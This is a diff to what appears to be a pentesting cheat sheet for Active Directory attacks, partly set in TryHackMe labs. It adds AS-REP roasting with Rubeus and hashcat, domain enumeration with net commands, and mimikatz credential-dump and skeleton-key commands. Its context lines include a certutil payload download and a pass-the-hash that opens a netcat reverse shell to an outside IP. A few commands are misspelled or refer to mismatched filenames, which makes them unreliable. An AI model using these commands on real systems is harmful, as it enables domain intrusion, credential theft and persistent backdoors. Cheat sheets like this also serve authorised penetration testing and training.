@@ -131,6 +131,7 @@ $ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0
 $ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 -a 0 ./GetUserSPNs-py_hashcat.txt ./TestPasswordList.txt
+# AS-REP roast
 $ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -390,6 +391,11 @@ PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
 ```zsh
 $ net use \\DC01\ipc$ "" /u:""
 $ net user %username%
+$ net user /domain
+$ net user TestUser /domain
+$ net group /domain
+$ net group "TestGroup" /domain
+$ net accounts /domain
 ```
 
 ## WinRM
@@ -590,6 +596,8 @@ tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.L
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
 mimikatz# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.31 5556"
+mimikatz# lsadump::lsa /inject /name:TestUser
+mimikatz# misc::skelton
 ```
 
 # Rebeus
@@ -598,6 +606,20 @@ PS> Rubeus.exe harvest /interval:30
 PS> echo XXX.XXX.XXX.XXX HOGE.com >> C:\Windows\System32\drivers\etc\hosts
 PS> Rubeus.exe brute /password:Password1 /noticket
 PS> Rubeus.exe kerberoast /outfile:hashes.txt
+PS> Rubeus.exe asreproast
+```
+```zsh
+$ vim Rubeus_asreproast_TestUser_hash.txt
+$ cat Rubeus_asreproast_TestUser_hash.txt
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' '
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' ' | wc -l
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' ' | tr -d '\n'
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' ' | tr -d '\n' | wc -l
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t'
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t' | sed 's/\$krb5asrep/\$krb5asrep\$23/'
+$ cat Rubeus_asreproast_TestUser_hash.txt | tr -d ' \n\t' | sed 's/\$krb5asrep/\$krb5asrep\$23/' > ./Rubeus_asreproast_TestUser_hash_edit.txt
+$ cat Rubeus_asreproast_TestUserhash_edit.txt
+$ hashcat -m 18200 ./Rubeus_asreproast_TestUser_hash_edit.txt Pass.txt
 ```
 
 # DCSync
